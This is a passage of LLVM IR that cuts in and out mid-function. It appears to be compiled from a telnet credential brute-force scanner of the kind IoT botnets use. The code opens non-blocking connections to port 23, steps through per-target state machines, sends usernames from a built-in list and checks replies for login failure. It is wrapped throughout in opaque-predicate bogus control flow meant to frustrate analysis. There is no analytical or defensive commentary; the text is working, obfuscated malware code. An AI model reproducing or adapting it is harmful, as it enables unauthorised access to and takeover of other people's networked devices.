  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %223, i32 0, i32 3
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 0
  br i1 %227, label %228, label %299

; <label>:228:                                    ; preds = %220
  %229 = load i32, i32* @x.69
  %230 = load i32, i32* @y.70
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %228
  %237 = load i32, i32* %14, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 4
  %241 = load i8, i8* %240, align 2
  %242 = add i8 %241, 1
  store i8 %242, i8* %240, align 2
  %243 = load i32, i32* %14, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 5
  %247 = load i8, i8* %246, align 1
  %248 = add i8 %247, 1
  store i8 %248, i8* %246, align 1
  %249 = load i32, i32* %14, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %250
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %251, i32 0, i32 5
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i64
  %255 = icmp eq i64 %254, 6
  %256 = load i32, i32* @x.69
  %257 = load i32, i32* @y.70
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart237, label %originalBB22alteredBB

originalBBpart237:                                ; preds = %originalBB22
  br i1 %255, label %264, label %269

; <label>:264:                                    ; preds = %originalBBpart237
  %265 = load i32, i32* %14, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 3
  store i8 1, i8* %268, align 1
  br label %269

; <label>:269:                                    ; preds = %264, %originalBBpart237
  %270 = load i32, i32* %14, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 4
  %274 = load i8, i8* %273, align 2
  %275 = zext i8 %274 to i64
  %276 = icmp eq i64 %275, 6
  br i1 %276, label %277, label %282

; <label>:277:                                    ; preds = %269
  %278 = load i32, i32* %14, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %279
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %280, i32 0, i32 3
  store i8 1, i8* %281, align 1
  br label %1509

; <label>:282:                                    ; preds = %269
  %283 = load i32, i32* @x.69
  %284 = load i32, i32* @y.70
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %282
  %291 = load i32, i32* @x.69
  %292 = load i32, i32* @y.70
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %299

; <label>:299:                                    ; preds = %originalBBpart241, %220
  br label %300

; <label>:300:                                    ; preds = %299, %200
  %301 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  store i16 2, i16* %301, align 4
  %302 = call zeroext i16 @htons(i16 zeroext 23) #10
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %302, i16* %303, align 2
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 3
  %305 = getelementptr inbounds [8 x i8], [8 x i8]* %304, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %305, i8 0, i64 8, i32 4, i1 false)
  %306 = load i32, i32* %14, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 1
  %310 = load i32, i32* %309, align 4
  %311 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 2
  %312 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %311, i32 0, i32 0
  store i32 %310, i32* %312, align 4
  %313 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %314 = load i32, i32* %14, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %315
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %316, i32 0, i32 0
  store i32 %313, i32* %317, align 16
  %318 = load i32, i32* %14, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %319
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %320, i32 0, i32 0
  %322 = load i32, i32* %321, align 16
  %323 = icmp eq i32 %322, -1
  br i1 %323, label %324, label %325

; <label>:324:                                    ; preds = %300
  br label %1509

; <label>:325:                                    ; preds = %300
  %326 = load i32, i32* %14, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %327
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %328, i32 0, i32 0
  %330 = load i32, i32* %329, align 16
  %331 = load i32, i32* %14, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 16
  %336 = call i32 (i32, i32, ...) @fcntl(i32 %335, i32 3, i8* null)
  %337 = or i32 %336, 2048
  %338 = call i32 (i32, i32, ...) @fcntl(i32 %330, i32 4, i32 %337)
  %339 = load i32, i32* %14, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %340
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %341, i32 0, i32 0
  %343 = load i32, i32* %342, align 16
  %344 = bitcast %struct.sockaddr_in* %26 to %struct.sockaddr*
  %345 = call i32 @connect(i32 %343, %struct.sockaddr* %344, i32 16)
  %346 = icmp eq i32 %345, -1
  br i1 %346, label %347, label %387

; <label>:347:                                    ; preds = %325
  %348 = load i32, i32* @x.69
  %349 = load i32, i32* @y.70
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %347
  %356 = call i32* @__errno_location() #10
  %357 = load i32, i32* %356, align 4
  %358 = icmp ne i32 %357, 115
  %359 = load i32, i32* @x.69
  %360 = load i32, i32* @y.70
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br i1 %358, label %367, label %387

; <label>:367:                                    ; preds = %originalBBpart245
  %368 = load i32, i32* @x.69
  %369 = load i32, i32* @y.70
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %367
  %376 = load i32, i32* %14, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %377
  call void @reset_telstate(%struct.telstate_t* %378)
  %379 = load i32, i32* @x.69
  %380 = load i32, i32* @y.70
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %407

; <label>:387:                                    ; preds = %originalBBpart245, %325
  %388 = load i32, i32* @x.69
  %389 = load i32, i32* @y.70
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %387
  %396 = load i32, i32* %14, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %397
  call void @advance_telstate(%struct.telstate_t* %398, i32 1)
  %399 = load i32, i32* @x.69
  %400 = load i32, i32* @y.70
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %407

; <label>:407:                                    ; preds = %originalBBpart253, %originalBBpart249
  %408 = load i32, i32* @x.69
  %409 = load i32, i32* @y.70
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %407
  %416 = load i32, i32* @x.69
  %417 = load i32, i32* @y.70
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %1492

; <label>:424:                                    ; preds = %originalBBpart216
  br label %425

; <label>:425:                                    ; preds = %424
  %426 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %20, i32 0, i32 0
  %427 = getelementptr inbounds [16 x i64], [16 x i64]* %426, i64 0, i64 0
  %428 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %427) #5, !srcloc !5
  %429 = extractvalue { i64, i64* } %428, 0
  %430 = extractvalue { i64, i64* } %428, 1
  %431 = trunc i64 %429 to i32
  store i32 %431, i32* %29, align 4
  %432 = ptrtoint i64* %430 to i64
  %433 = trunc i64 %432 to i32
  store i32 %433, i32* %30, align 4
  br label %434

; <label>:434:                                    ; preds = %425
  br label %435

; <label>:435:                                    ; preds = %434
  %436 = load i32, i32* %14, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 0
  %440 = load i32, i32* %439, align 16
  %441 = srem i32 %440, 64
  %442 = zext i32 %441 to i64
  %443 = shl i64 1, %442
  %444 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %20, i32 0, i32 0
  %445 = load i32, i32* %14, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 16
  %450 = sdiv i32 %449, 64
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds [16 x i64], [16 x i64]* %444, i64 0, i64 %451
  %453 = load i64, i64* %452, align 8
  %454 = or i64 %453, %443
  store i64 %454, i64* %452, align 8
  %455 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 0
  store i64 0, i64* %455, align 8
  %456 = load i32, i32* %11, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 1
  store i64 %457, i64* %458, align 8
  %459 = load i32, i32* %14, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 0
  %463 = load i32, i32* %462, align 16
  %464 = add nsw i32 %463, 1
  %465 = call i32 @select(i32 %464, %struct.fd_set* null, %struct.fd_set* %20, %struct.fd_set* null, %struct.timeval* %21)
  store i32 %465, i32* %15, align 4
  %466 = load i32, i32* %15, align 4
  %467 = icmp eq i32 %466, 1
  br i1 %467, label %468, label %522

; <label>:468:                                    ; preds = %435
  %469 = call i64 @time(i64* null) #5
  %470 = trunc i64 %469 to i32
  %471 = load i32, i32* %14, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 7
  store i32 %470, i32* %474, align 16
  store i32 4, i32* %22, align 4
  store i32 0, i32* %23, align 4
  %475 = load i32, i32* %14, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 0
  %479 = load i32, i32* %478, align 16
  %480 = bitcast i32* %23 to i8*
  %481 = call i32 @getsockopt(i32 %479, i32 1, i32 4, i8* %480, i32* %22) #5
  %482 = load i32, i32* %23, align 4
  %483 = icmp ne i32 %482, 0
  br i1 %483, label %484, label %488

; <label>:484:                                    ; preds = %468
  %485 = load i32, i32* %14, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %486
  call void @reset_telstate(%struct.telstate_t* %487)
  br label %521

; <label>:488:                                    ; preds = %468
  %489 = load i32, i32* @x.69
  %490 = load i32, i32* @y.70
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %488
  %497 = load i32, i32* %14, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 0
  %501 = load i32, i32* %500, align 16
  %502 = load i32, i32* %14, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 0
  %506 = load i32, i32* %505, align 16
  %507 = call i32 (i32, i32, ...) @fcntl(i32 %506, i32 3, i8* null)
  %508 = and i32 %507, -2049
  %509 = call i32 (i32, i32, ...) @fcntl(i32 %501, i32 4, i32 %508)
  %510 = load i32, i32* %14, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %511
  call void @advance_telstate(%struct.telstate_t* %512, i32 2)
  %513 = load i32, i32* @x.69
  %514 = load i32, i32* @y.70
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart264, label %originalBB59alteredBB

originalBBpart264:                                ; preds = %originalBB59
  br label %521

; <label>:521:                                    ; preds = %originalBBpart264, %484
  br label %1509

; <label>:522:                                    ; preds = %435
  %523 = load i32, i32* @x.69
  %524 = load i32, i32* @y.70
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %522
  %531 = load i32, i32* %15, align 4
  %532 = icmp eq i32 %531, -1
  %533 = load i32, i32* @x.69
  %534 = load i32, i32* @y.70
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %532, label %541, label %561

; <label>:541:                                    ; preds = %originalBBpart268
  %542 = load i32, i32* @x.69
  %543 = load i32, i32* @y.70
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %541
  %550 = load i32, i32* %14, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %551
  call void @reset_telstate(%struct.telstate_t* %552)
  %553 = load i32, i32* @x.69
  %554 = load i32, i32* @y.70
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %1509

; <label>:561:                                    ; preds = %originalBBpart268
  %562 = load i32, i32* @x.69
  %563 = load i32, i32* @y.70
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %561
  %570 = load i32, i32* @x.69
  %571 = load i32, i32* @y.70
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %578

; <label>:578:                                    ; preds = %originalBBpart276
  %579 = load i32, i32* @x.69
  %580 = load i32, i32* @y.70
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %578
  %587 = load i32, i32* %14, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 7
  %591 = load i32, i32* %590, align 16
  %592 = add i32 %591, 7
  %593 = zext i32 %592 to i64
  %594 = call i64 @time(i64* null) #5
  %595 = icmp slt i64 %593, %594
  %596 = load i32, i32* @x.69
  %597 = load i32, i32* @y.70
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBBpart291, label %originalBB78alteredBB

originalBBpart291:                                ; preds = %originalBB78
  br i1 %595, label %604, label %624

; <label>:604:                                    ; preds = %originalBBpart291
  %605 = load i32, i32* @x.69
  %606 = load i32, i32* @y.70
  %607 = sub i32 %605, 1
  %608 = mul i32 %605, %607
  %609 = urem i32 %608, 2
  %610 = icmp eq i32 %609, 0
  %611 = icmp slt i32 %606, 10
  %612 = or i1 %610, %611
  br i1 %612, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %604
  %613 = load i32, i32* %14, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %614
  call void @reset_telstate(%struct.telstate_t* %615)
  %616 = load i32, i32* @x.69
  %617 = load i32, i32* @y.70
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %624

; <label>:624:                                    ; preds = %originalBBpart295, %originalBBpart291
  %625 = load i32, i32* @x.69
  %626 = load i32, i32* @y.70
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %624
  %633 = load i32, i32* @x.69
  %634 = load i32, i32* @y.70
  %635 = sub i32 %633, 1
  %636 = mul i32 %633, %635
  %637 = urem i32 %636, 2
  %638 = icmp eq i32 %637, 0
  %639 = icmp slt i32 %634, 10
  %640 = or i1 %638, %639
  br i1 %640, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %1492

; <label>:641:                                    ; preds = %originalBBpart216
  %642 = load i32, i32* %14, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 0
  %646 = load i32, i32* %645, align 16
  %647 = load i32, i32* %11, align 4
  %648 = load i32, i32* %14, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 9
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @read_until_response(i32 %646, i32 %647, i8* %652, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %654 = icmp ne i32 %653, 0
  br i1 %654, label %655, label %710

; <label>:655:                                    ; preds = %641
  %656 = load i32, i32* @x.69
  %657 = load i32, i32* @y.70
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %655
  %664 = call i64 @time(i64* null) #5
  %665 = trunc i64 %664 to i32
  %666 = load i32, i32* %14, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 7
  store i32 %665, i32* %669, align 16
  %670 = load i32, i32* %14, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 9
  %674 = load i8*, i8** %673, align 8
  %675 = call i32 @contains_fail(i8* %674)
  %676 = icmp ne i32 %675, 0
  %677 = load i32, i32* @x.69
  %678 = load i32, i32* @y.70
  %679 = sub i32 %677, 1
  %680 = mul i32 %677, %679
  %681 = urem i32 %680, 2
  %682 = icmp eq i32 %681, 0
  %683 = icmp slt i32 %678, 10
  %684 = or i1 %682, %683
  br i1 %684, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %676, label %685, label %689

; <label>:685:                                    ; preds = %originalBBpart2103
  %686 = load i32, i32* %14, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %687
  call void @advance_telstate(%struct.telstate_t* %688, i32 0)
  br label %709

; <label>:689:                                    ; preds = %originalBBpart2103
  %690 = load i32, i32* @x.69
  %691 = load i32, i32* @y.70
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %689
  %698 = load i32, i32* %14, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %699
  call void @advance_telstate(%struct.telstate_t* %700, i32 3)
  %701 = load i32, i32* @x.69
  %702 = load i32, i32* @y.70
  %703 = sub i32 %701, 1
  %704 = mul i32 %701, %703
  %705 = urem i32 %704, 2
  %706 = icmp eq i32 %705, 0
  %707 = icmp slt i32 %702, 10
  %708 = or i1 %706, %707
  br i1 %708, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %709

; <label>:709:                                    ; preds = %originalBBpart2107, %685
  br label %1509

; <label>:710:                                    ; preds = %641
  %711 = load i32, i32* %14, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %712
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %713, i32 0, i32 7
  %715 = load i32, i32* %714, align 16
  %716 = add i32 %715, 7
  %717 = zext i32 %716 to i64
  %718 = call i64 @time(i64* null) #5
  %719 = icmp slt i64 %717, %718
  br i1 %719, label %720, label %724

; <label>:720:                                    ; preds = %710
  %721 = load i32, i32* %14, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %722
  call void @reset_telstate(%struct.telstate_t* %723)
  br label %724

; <label>:724:                                    ; preds = %720, %710
  %725 = load i32, i32* @x.69
  %726 = load i32, i32* @y.70
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %724
  %733 = load i32, i32* @x.69
  %734 = load i32, i32* @y.70
  %735 = sub i32 %733, 1
  %736 = mul i32 %733, %735
  %737 = urem i32 %736, 2
  %738 = icmp eq i32 %737, 0
  %739 = icmp slt i32 %734, 10
  %740 = or i1 %738, %739
  br i1 %740, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %1492

; <label>:741:                                    ; preds = %originalBBpart216
  %742 = load i32, i32* %14, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %743
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %744, i32 0, i32 0
  %746 = load i32, i32* %745, align 16
  %747 = load i32, i32* %14, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 4
  %751 = load i8, i8* %750, align 2
  %752 = zext i8 %751 to i64
  %753 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %752
  %754 = load i8*, i8** %753, align 8
  %755 = load i32, i32* %14, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 4
  %759 = load i8, i8* %758, align 2
  %760 = zext i8 %759 to i64
  %761 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %760
  %762 = load i8*, i8** %761, align 8
  %763 = call i64 @strlen(i8* %762) #9
  %764 = call i64 @send(i32 %746, i8* %754, i64 %763, i32 16384)
  %765 = icmp slt i64 %764, 0
